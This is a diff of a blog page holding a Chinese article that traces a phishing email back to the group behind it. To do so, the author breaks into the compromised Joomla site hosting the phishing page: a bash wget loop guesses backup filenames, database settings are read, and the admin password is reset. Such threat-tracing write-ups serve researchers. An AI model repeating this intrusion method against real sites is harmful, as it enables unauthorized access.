@@ -1,154 +1,123 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<html lang="en">
+
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="generator" content="Hugo 0.69.0-DEV" />
-
-  <title>如何通过一封恶意邮件追踪幕后黑客组织 &middot; XEYE</title>
-
-  <meta name="description" content="" />
-
-  
-  <meta property="og:locale" content="en-us"/>
-
-  
-  <meta property="og:image" content="https://xeye.io/images/kenan.jpg">
-
-  
-  <meta property="og:site_name" content="XEYE"/>
-  <meta property="og:title" content="如何通过一封恶意邮件追踪幕后黑客组织"/>
-  <meta property="og:description" content="声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。
- 一、前言 近日朋友收到一封来自海外的钓鱼邮件，委托我帮忙分析。因此我对钓鱼者身份和攻击路径进行了一次详细的溯源。大致摸清了攻击者组织身份、攻击手法以及动机。本次溯源工作主要是通过提取攻击者控制的肉鸡服务器、网站访问日志、攻击者后门特征等。关联分析这些日志和特征最终得到攻击者的身份信息。本文以流水账的方式，详细记录整个溯源过程，包括分析手法和思路，以供安全研究人员参考。
- 二、信息收集 这是一封冒充 Microsoft Outlook WebApp 密码过期的钓鱼邮件："/>
-  <meta property="og:url" content="https://xeye.io/post/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2019-11-02T13:48:59&#43;0800"/>
-  <meta property="article:modified_time" content="2019-11-02T13:48:59&#43;0800"/>
-  <meta property="article:author" content="DMJ">
-  
-  
-  
-
-  <script type="application/ld+json">
-  {
-    "@context" : "http://schema.org",
-    "@type" : "Blog",
-    "name": "XEYE",
-    "url" : "https://xeye.io/",
-    "image": "https://xeye.io/images/kenan.jpg",
-    "description": "小学生"
-  }
-  </script>
-
-  
-  <script type="application/ld+json">
-  {
-    "@context": "http://schema.org",
-    "@type": "BlogPosting",
-    "name": "如何通过一封恶意邮件追踪幕后黑客组织",
-    "headline": "如何通过一封恶意邮件追踪幕后黑客组织",
-    "datePublished": "2019-11-02T13:48:59\x2b0800",
-    "dateModified": "2019-11-02T13:48:59\x2b0800",
-    "author": {
-      "@type": "Person",
-      "name": "DMJ",
-      "url": "https://xeye.io/"
-    },
-    "image": "https://xeye.io/images/kenan.jpg",
-    "url": "https://xeye.io/post/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/",
-    "description": "声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。\n 一、前言 近日朋友收到一封来自海外的钓鱼邮件，委托我帮忙分析。因此我对钓鱼者身份和攻击路径进行了一次详细的溯源。大致摸清了攻击者组织身份、攻击手法以及动机。本次溯源工作主要是通过提取攻击者控制的肉鸡服务器、网站访问日志、攻击者后门特征等。关联分析这些日志和特征最终得到攻击者的身份信息。本文以流水账的方式，详细记录整个溯源过程，包括分析手法和思路，以供安全研究人员参考。\n 二、信息收集 这是一封冒充 Microsoft Outlook WebApp 密码过期的钓鱼邮件："
-  }
-  </script>
-  
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.69.0-DEV" />
 
 
-  <link type="text/css"
-        rel="stylesheet"
-        href="https://xeye.io/css/print.css"
-        media="print">
-
-  <link type="text/css"
-        rel="stylesheet"
-        href="https://xeye.io/css/poole.css">
-
-  <link type="text/css"
-        rel="stylesheet"
-        href="https://xeye.io/css/hyde.css">
-
-  
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/poal-jsdelivr@1.2.0/favicons/favicon.ico" />
 
 
-  <link type="text/css" rel="stylesheet" href="https://xeye.io/css/blog.css">
+<title>如何通过一封恶意邮件追踪幕后黑客组织 - XEYE</title>
 
-  <link rel="stylesheet"
-        href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700&display=swap">
 
-  <link rel="stylesheet"
-        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css"
-        integrity="sha256-mmgLkCYLUQbXn0B1SRqzHar6dCnv9oZFPEC1g1cwlkk="
-        crossorigin="anonymous" />
+<meta name="author" content="DSRKafuU" />
 
-  <link rel="apple-touch-icon-precomposed"
-        sizes="144x144"
-        href="/apple-touch-icon-144-precomposed.png">
 
-  <link rel="shortcut icon" href="/favicon.png">
+<meta name="description" content="A minimal Hugo theme with nice theme color." />
 
-  
-  </head>
-<body>
-  <aside class="sidebar">
-  <div class="container">
-    <div class="sidebar-about">
-      
+
+<meta property="og:title" content="如何通过一封恶意邮件追踪幕后黑客组织" />
+<meta property="og:description" content="声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。 一、前言 近日朋友收到一封来自海外的钓鱼邮件，委托我帮忙分析。因此我对钓鱼者身份和攻击路径进行了一次详细的溯源" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xeye.io/post/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/" />
+<meta property="og:image" content="https://xeye.io/img/og.png"/>
+<meta property="article:published_time" content="2019-11-02T13:48:59+08:00" />
+<meta property="article:modified_time" content="2019-11-02T13:48:59+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://xeye.io/img/og.png"/>
+
+<meta name="twitter:title" content="如何通过一封恶意邮件追踪幕后黑客组织"/>
+<meta name="twitter:description" content="声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。 一、前言 近日朋友收到一封来自海外的钓鱼邮件，委托我帮忙分析。因此我对钓鱼者身份和攻击路径进行了一次详细的溯源"/>
+
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+<link rel="stylesheet" href="/assets/css/fuji.min.css" />
+
+
+
+
+
+
+</head>
+
+<body data-theme="auto">
+    <script data-cfasync="false">
+    
+    var fujiThemeData = localStorage.getItem('fuji_data-theme');
+    
+    if (!fujiThemeData) {
+        localStorage.setItem('fuji_data-theme', 'auto');
+    } else {
         
-        <div class="author-image">
-          <img src="https://xeye.io/images/kenan.jpg" class="img-circle img-headshot center" alt="Profile Picture">
+        if (fujiThemeData !== 'auto') {
+            document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+        }
+    }
+</script>
+<script data-cfasync="false">
+    
+    function browserDetection(ua) {
+        if (ua.indexOf('MSIE ') > 0 || ua.indexOf('Trident/') > 0) {
+            return true;
+        }
+        return false;
+    }
+
+    var ua = window.navigator.userAgent;
+    if (browserDetection(ua)) {
+        window.location.href('https:\/\/xeye.io\/ie\/');
+    }
+</script>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://xeye.io">XEYE</a>
+            
+            <span class="title-sub">A minimal Hugo theme.</span>
+            
         </div>
-        
-      
-
-      <h1>XEYE</h1>
-
-      
-      <p class="lead">小学生</p>
-      
     </div>
+</header>
 
-    <nav>
-      <ul class="sidebar-nav">
-        <li>
-          <a href="https://xeye.io/">Home</a>
-        </li>
-        <li>
-          <a href="/post/"> Post </a>
-        </li><li>
-          <a href="/about/"> About </a>
-        </li>
-      </ul>
-    </nav>
-
-    <section class="social-icons">
-      
-      <a href="https://github.com/xeyelab" rel="me" title="GitHub">
-        <i class="fab fa-github" aria-hidden="true"></i>
-      </a>
-      
-    </section>
-  </div>
-</aside>
-
-
-  <main class="content container">
-  <div class="post">
-  <h1>如何通过一封恶意邮件追踪幕后黑客组织</h1>
-
-  <div class="post-date">
-    <time datetime="2019-11-02T13:48:59&#43;0800">Nov 2, 2019</time> · 17 min read
-  </div>
-
-  <blockquote>
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://xeye.io/post/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/">如何通过一封恶意邮件追踪幕后黑客组织</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><ion-icon name="today"></ion-icon>&nbsp;2019-11-02</span><span><ion-icon name="file-tray"></ion-icon>&nbsp;10105 words</span><span><ion-icon name="pricetags"></ion-icon>&nbsp;No tag</span>
+    </div>
+    
+    
+    <div class="post-content markdown-body">
+        <blockquote>
 <p>声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。</p>
 </blockquote>
 <h2 id="一前言">一、前言</h2>
@@ -156,7 +125,9 @@
 <hr>
 <h2 id="二信息收集">二、信息收集</h2>
 <p>这是一封冒充 Microsoft Outlook WebApp 密码过期的钓鱼邮件：</p>
-<p><img src="https://camo.githubusercontent.com/81fde0460d50552e89d30550c007c34c8673b436/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e736e7232653234743975336a796c377a39797062786b372f254539253932253933254539254231254243254539253832254145254534254242254236312e6a7067" alt="钓鱼邮件1.jpg-172.9kB"></p>
+<p><a href="https://camo.githubusercontent.com/81fde0460d50552e89d30550c007c34c8673b436/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e736e7232653234743975336a796c377a39797062786b372f254539253932253933254539254231254243254539253832254145254534254242254236312e6a7067" target="_blank">
+    <img src="https://camo.githubusercontent.com/81fde0460d50552e89d30550c007c34c8673b436/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e736e7232653234743975336a796c377a39797062786b372f254539253932253933254539254231254243254539253832254145254534254242254236312e6a7067" alt="钓鱼邮件1.jpg-172.9kB" />
+</a></p>
 <h3 id="21-邮件正文">2.1 <strong>邮件正文：</strong></h3>
 <pre><code>Received: from sysmailout1.platon.sk (unknown [85.248.228.17])
 	by bizmx16.qq.com (NewMx) with SMTP id 
@@ -209,7 +180,8 @@ immediateIy.&lt;span class=3D&quot;Apple-converted-space&quot;&gt; &lt;br&gt;
 &lt;a href=3D&quot;http://www.rosturplast.com/shells/logon.secureaccess/?ml=3Dtest=@test.cn
 
 略...
-</code></pre><h3 id="22-分析邮件内容"><strong>2.2 分析邮件内容</strong></h3>
+</code></pre>
+<h3 id="22-分析邮件内容"><strong>2.2 分析邮件内容</strong></h3>
 <p><strong>根据邮件内容得到的信息如下：</strong></p>
 <blockquote>
 <p>钓鱼网站： [www.rosturplast.com（137.74.81.5](<a href="http://www.rosturplast.com">http://www.rosturplast.com</a>(137.74.81.5/) 法国） 钓鱼链接: <a href="http://www.rosturplast.com/shells/logon.secureaccess/?ml=test@test.cn">http://www.rosturplast.com/shells/logon.secureaccess/?ml=test@test.cn</a> 发件地址： <a href="mailto:no-response@365.mirohaviar.sk">no-response@365.mirohaviar.sk</a> 服务商： Platon Technologies, s.r.o （斯洛伐克） SMTP： sysmailout1.platon.sk （85.248.228.17 斯洛伐克）</p>
@@ -221,24 +193,42 @@ immediateIy.&lt;span class=3D&quot;Apple-converted-space&quot;&gt; &lt;br&gt;
 <p>目标网站：www.rosturplast.com</p>
 </blockquote>
 <p>访问钓鱼链接，一个克隆OWA修改密码的的虚假页面，我们按照正常流程走一遍，密码随便输入。不出所料页面提示密码错误，这么做可以收集受害者多个密码提高成功率，仔细想想这个功能还是很贴心的：）。</p>
-<p><strong>Step 1</strong> <img src="https://camo.githubusercontent.com/cf5eb29e9f1a216452e33baa9c5af05a0e6c98a6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f653779673171336c64797037636d333232787866356e70392f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132312e706e67" alt="钓鱼邮件页面1.png-45.6kB"> <strong>Step 2</strong> <img src="https://camo.githubusercontent.com/522755c214de839e26bebbde65f19ae5cad0f903/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c67686876326d3363316a6b31366d71663562336a346b682f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132332e706e67" alt="钓鱼邮件页面3.png-50.6kB"> <strong>Step 3</strong> <img src="https://camo.githubusercontent.com/0ff9a3be9307405c51a01af5b5f1347f10c8b2a2/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f73626138626f7261637471626e71736f6b6e377570666e6d2f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132322e706e67" alt="钓鱼邮件页面2.png-35.6kB"></p>
+<p><strong>Step 1</strong> <a href="https://camo.githubusercontent.com/cf5eb29e9f1a216452e33baa9c5af05a0e6c98a6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f653779673171336c64797037636d333232787866356e70392f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132312e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/cf5eb29e9f1a216452e33baa9c5af05a0e6c98a6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f653779673171336c64797037636d333232787866356e70392f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132312e706e67" alt="钓鱼邮件页面1.png-45.6kB" />
+</a> <strong>Step 2</strong> <a href="https://camo.githubusercontent.com/522755c214de839e26bebbde65f19ae5cad0f903/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c67686876326d3363316a6b31366d71663562336a346b682f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132332e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/522755c214de839e26bebbde65f19ae5cad0f903/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c67686876326d3363316a6b31366d71663562336a346b682f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132332e706e67" alt="钓鱼邮件页面3.png-50.6kB" />
+</a> <strong>Step 3</strong> <a href="https://camo.githubusercontent.com/0ff9a3be9307405c51a01af5b5f1347f10c8b2a2/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f73626138626f7261637471626e71736f6b6e377570666e6d2f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132322e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/0ff9a3be9307405c51a01af5b5f1347f10c8b2a2/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f73626138626f7261637471626e71736f6b6e377570666e6d2f254539253932253933254539254231254243254539253832254145254534254242254236254539254131254235254539253944254132322e706e67" alt="钓鱼邮件页面2.png-35.6kB" />
+</a></p>
 <hr>
-<p><strong>抓包如下：</strong> 注入、跨站之流都是不存在的。 <img src="https://camo.githubusercontent.com/4c89986d1c0ae66586cac60c4779d652d078e3a3/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3877773975727833323161677a7239796169306d756e73392f2545392539322539332545392542312542432545392541312542352545392539442541322545382541312541382545352538442539352545362538462539302545342542412541342545362538412539332545352538432538352e706e67" alt="钓鱼页面表单提交抓包.png-205.9kB"></p>
+<p><strong>抓包如下：</strong> 注入、跨站之流都是不存在的。 <a href="https://camo.githubusercontent.com/4c89986d1c0ae66586cac60c4779d652d078e3a3/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3877773975727833323161677a7239796169306d756e73392f2545392539322539332545392542312542432545392541312542352545392539442541322545382541312541382545352538442539352545362538462539302545342542412541342545362538412539332545352538432538352e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/4c89986d1c0ae66586cac60c4779d652d078e3a3/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3877773975727833323161677a7239796169306d756e73392f2545392539322539332545392542312542432545392541312542352545392539442541322545382541312541382545352538442539352545362538462539302545342542412541342545362538412539332545352538432538352e706e67" alt="钓鱼页面表单提交抓包.png-205.9kB" />
+</a></p>
 <p>访问首页，这是一家俄罗斯的塑料水管厂商，攻击者入侵了这个网站，放置了钓鱼页面，再通过邮件传播。</p>
-<p><img src="https://camo.githubusercontent.com/7e6da9683c707c97e84f2ea3af89ddff0b97613c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6867367636353961686e6276646b7874786c6437646670722f53637265656e73686f742d323031382d31322d31312532305254502532302545322538302539332532305275737369616e2532306d616e7566616374757265722532306f66253230706c61737469632532307069706573253230616e6425323066697474696e6773253230254532253830253933253230486967682532305175616c6974792532305069706573253230616e6425323046697474696e67732e706e67" alt="Screenshot-2018-12-11 RTP – Russian manufacturer of plastic pipes and fittings – High Quality Pipes and Fittings.png-1622.7kB"></p>
+<p><a href="https://camo.githubusercontent.com/7e6da9683c707c97e84f2ea3af89ddff0b97613c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6867367636353961686e6276646b7874786c6437646670722f53637265656e73686f742d323031382d31322d31312532305254502532302545322538302539332532305275737369616e2532306d616e7566616374757265722532306f66253230706c61737469632532307069706573253230616e6425323066697474696e6773253230254532253830253933253230486967682532305175616c6974792532305069706573253230616e6425323046697474696e67732e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/7e6da9683c707c97e84f2ea3af89ddff0b97613c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6867367636353961686e6276646b7874786c6437646670722f53637265656e73686f742d323031382d31322d31312532305254502532302545322538302539332532305275737369616e2532306d616e7566616374757265722532306f66253230706c61737469632532307069706573253230616e6425323066697474696e6773253230254532253830253933253230486967682532305175616c6974792532305069706573253230616e6425323046697474696e67732e706e67" alt="Screenshot-2018-12-11 RTP – Russian manufacturer of plastic pipes and fittings – High Quality Pipes and Fittings.png-1622.7kB" />
+</a></p>
 <p><strong>端口扫描显示开放了一堆端口，防火墙做了策略限制。</strong></p>
-<p><img src="https://camo.githubusercontent.com/4904d66caa52b9b4e70086311ed21b79c32e984e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f36707677726e3374393571646e33776366303134636d33302f6e6d61702d726f73747572706c6173742e636f6d2d636172626f6e2e706e67" alt="nmap-rosturplast.com-carbon.png-397.3kB"> <strong>通过扫描分析，得到沦陷主机信息如下:</strong></p>
+<p><a href="https://camo.githubusercontent.com/4904d66caa52b9b4e70086311ed21b79c32e984e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f36707677726e3374393571646e33776366303134636d33302f6e6d61702d726f73747572706c6173742e636f6d2d636172626f6e2e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/4904d66caa52b9b4e70086311ed21b79c32e984e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f36707677726e3374393571646e33776366303134636d33302f6e6d61702d726f73747572706c6173742e636f6d2d636172626f6e2e706e67" alt="nmap-rosturplast.com-carbon.png-397.3kB" />
+</a> <strong>通过扫描分析，得到沦陷主机信息如下:</strong></p>
 <blockquote>
-<p>[+] HOST: <a href="http://www.rosturplast.com/">www.rosturplast.com</a> （137.74.81.5 法国） [+] OS: Red Hat 4.8 [+] Web Server: Apache/2.4.6 OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 [+] CMS: Joomla 3.3.3 （Joomla!是一套海外流行的建站系统，基于PHP+MySQL开发）</p>
+<p>[+] HOST: <a href="http://www.rosturplast.com/" target="_blank">www.rosturplast.com</a> （137.74.81.5 法国） [+] OS: Red Hat 4.8 [+] Web Server: Apache/2.4.6 OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 [+] CMS: Joomla 3.3.3 （Joomla!是一套海外流行的建站系统，基于PHP+MySQL开发）</p>
 </blockquote>
-<p><strong>这是一个低版本的Joomla，joomscan扫描显示受害网站有一堆漏洞，看起来弱不禁风，Getshell指日可待。</strong> <img src="https://camo.githubusercontent.com/0d3ce62a2869ce0a73eea5618edb10c20f3627a0/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f746c627a666d616c307538747a79756b6e696677716d37652f6a6f6f6d7363616e2d726f73747572706c6173742e706e67" alt="joomscan-rosturplast.png-995.8kB"></p>
-<p>扫描发现PHPMailer RCE漏洞，不过需要邮件发送表单功能才能利用，这一堆漏洞里面，看起来唯一有机会的是CVE-2016-9838（Joomla! Core Remote Privilege Escalation Vulnerability），然而经过测试攻击者（丧心病狂）贴心的把用户注册页面删除了！堵住了漏洞，导致无法利用。 <img src="https://camo.githubusercontent.com/9d2fabf7fa89b55eab38a86b94db0708b48ed275/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f766b6a7074356d767577333631386d716f3339366e3167652f4669726553686f74253230436170747572652532302e706e67" alt="FireShot Capture .png-146.7kB"></p>
+<p><strong>这是一个低版本的Joomla，joomscan扫描显示受害网站有一堆漏洞，看起来弱不禁风，Getshell指日可待。</strong> <a href="https://camo.githubusercontent.com/0d3ce62a2869ce0a73eea5618edb10c20f3627a0/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f746c627a666d616c307538747a79756b6e696677716d37652f6a6f6f6d7363616e2d726f73747572706c6173742e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/0d3ce62a2869ce0a73eea5618edb10c20f3627a0/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f746c627a666d616c307538747a79756b6e696677716d37652f6a6f6f6d7363616e2d726f73747572706c6173742e706e67" alt="joomscan-rosturplast.png-995.8kB" />
+</a></p>
+<p>扫描发现PHPMailer RCE漏洞，不过需要邮件发送表单功能才能利用，这一堆漏洞里面，看起来唯一有机会的是CVE-2016-9838（Joomla! Core Remote Privilege Escalation Vulnerability），然而经过测试攻击者（丧心病狂）贴心的把用户注册页面删除了！堵住了漏洞，导致无法利用。 <a href="https://camo.githubusercontent.com/9d2fabf7fa89b55eab38a86b94db0708b48ed275/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f766b6a7074356d767577333631386d716f3339366e3167652f4669726553686f74253230436170747572652532302e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/9d2fabf7fa89b55eab38a86b94db0708b48ed275/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f766b6a7074356d767577333631386d716f3339366e3167652f4669726553686f74253230436170747572652532302e706e67" alt="FireShot Capture .png-146.7kB" />
+</a></p>
 <p>机智的我（此时毫无办法），开始挂字典整合Joomla目录盲扫备份文件，最后发现目标存在PhpMyAdmin后台，和一个报错页面，页面显示了网站绝对路径和疑似以日期格式生成的网站备份的文件名。</p>
 <pre><code>/var/www/rosturpl/data/www/rosturplast.com/rosturplast.com.2015-11-11.zip
-</code></pre><h3 id="32-陷入僵局"><strong>3.2 陷入僵局</strong></h3>
+</code></pre>
+<h3 id="32-陷入僵局"><strong>3.2 陷入僵局</strong></h3>
 <p>尝试下载这个文件，http响应404。看了一下同站有多个站点，但旁站渗透是个体力活，国外这种典型的CloudLinux+cPanel的架构不好提权。到这一步陷入了僵局，睡个午觉养养神，下午继续研究。</p>
 <pre><code>wget http://www.rosturplast.com/rosturplast.com.2015-11-11.zip  错误 404：Not Found
-</code></pre><h3 id="33-后台提权"><strong>3.3 后台提权</strong></h3>
+</code></pre>
+<h3 id="33-后台提权"><strong>3.3 后台提权</strong></h3>
 <p>不到万不得已，不从旁站和C段入手，稍加思索根据报错页面的备份文件名格式生成日期文件，尝试遍历日期下载，碰碰运气。</p>
 <p>脚本内容：</p>
 <pre><code>#!/bin/bash
@@ -255,8 +245,13 @@ startdate=`date -d &quot;+1 day $date&quot; +%Y-%m-%d`
 startdateother=`date -d &quot;+1 day $date&quot; +%Y-%m-%d`
 wget $url
 done
-</code></pre><p>脚本大概跑了一个下午，当到达2017-08-07的时候，响应200状态码，看到rosturplast.com.2017-08-07.zip的文件大小为177M 感觉成了，解压后果然是整站备份，果然是柳暗花明又一shell。</p>
-<p><img src="https://camo.githubusercontent.com/d742c66f0c94150e00d18052faeaa988146bc779/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f666969657a397575377231327a71726a37736c77626536742f776765742d726f73747572702e706e67" alt="wget-rosturp.png-864.5kB"> <img src="https://camo.githubusercontent.com/d84503f1cb7d92cfa3993c90bddb2a46213c13b6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f74386e3036777a347932707676306f7930323174343837682f323031382d31322d313225323030322d34342d31302545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-01 05-18-10屏幕截图.png-159.4kB"></p>
+</code></pre>
+<p>脚本大概跑了一个下午，当到达2017-08-07的时候，响应200状态码，看到rosturplast.com.2017-08-07.zip的文件大小为177M 感觉成了，解压后果然是整站备份，果然是柳暗花明又一shell。</p>
+<p><a href="https://camo.githubusercontent.com/d742c66f0c94150e00d18052faeaa988146bc779/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f666969657a397575377231327a71726a37736c77626536742f776765742d726f73747572702e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/d742c66f0c94150e00d18052faeaa988146bc779/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f666969657a397575377231327a71726a37736c77626536742f776765742d726f73747572702e706e67" alt="wget-rosturp.png-864.5kB" />
+</a> <a href="https://camo.githubusercontent.com/d84503f1cb7d92cfa3993c90bddb2a46213c13b6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f74386e3036777a347932707676306f7930323174343837682f323031382d31322d313225323030322d34342d31302545352542312538462545352542392539352545362538382541412545352539422542452e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/d84503f1cb7d92cfa3993c90bddb2a46213c13b6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f74386e3036777a347932707676306f7930323174343837682f323031382d31322d313225323030322d34342d31302545352542312538462545352542392539352545362538382541412545352539422542452e706e67" alt="2018-12-01 05-18-10屏幕截图.png-159.4kB" />
+</a></p>
 <p>查看配置文件<code>configuration.php</code>得到数据库连接信息，登录PhpMyAdmin后台。低权限无法直接写shell，只能修改默认密码登录Joomla!后台。</p>
 <pre><code>public $dbtype = 'mysqli';
 public $host = 'localhost';
@@ -266,19 +261,34 @@ public $db = 'rtp_com3';
 public $dbprefix = 'ms8ef_';
 public $live_site = '';
 public $secret = '5qp******4zU';     //敏感信息打码    
-</code></pre><p><img src="https://camo.githubusercontent.com/3999076e3cbb3ff3a14bf8e31a0b133e5bcf43af/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f32736d69386e3478627766797435396b67336b70683737782f726f73747572702e636f6e66696775726174696f6e2d2e706e67" alt="rosturp.configuration-.png-708.2kB"> <img src="https://camo.githubusercontent.com/70f852977521022cc9e46a481e5c09a07b1f987c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f63767268387a303865346371356e30693779657871356f642f726f73747572706c6173742e636f6d2d7068706d7961646d696e253230253238312532392e706e67" alt="rosturplast.com-phpmyadmin (1).png-136.6kB"></p>
+</code></pre>
+<p><a href="https://camo.githubusercontent.com/3999076e3cbb3ff3a14bf8e31a0b133e5bcf43af/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f32736d69386e3478627766797435396b67336b70683737782f726f73747572702e636f6e66696775726174696f6e2d2e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/3999076e3cbb3ff3a14bf8e31a0b133e5bcf43af/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f32736d69386e3478627766797435396b67336b70683737782f726f73747572702e636f6e66696775726174696f6e2d2e706e67" alt="rosturp.configuration-.png-708.2kB" />
+</a> <a href="https://camo.githubusercontent.com/70f852977521022cc9e46a481e5c09a07b1f987c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f63767268387a303865346371356e30693779657871356f642f726f73747572706c6173742e636f6d2d7068706d7961646d696e253230253238312532392e706e67" target="_blank">
+    <img src="https://camo.githubusercontent.com/70f852977521022cc9e46a481e5c09a07b1f987c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f63767268387a303865346371356e30693779657871356f642f726f73747572706c6173742e636f6d2d7068706d7961646d696e253230253238312532392e706e67" alt="rosturplast.com-phpmyadmin (1).png-136.6kB" />
+</a></p>
 <p>备份原始密文以备还原，将后台密码修改为 test123456XYZ</p>
 <pre><code>http://www.rosturplast.com/administrator/
 admin / test123456XYZ
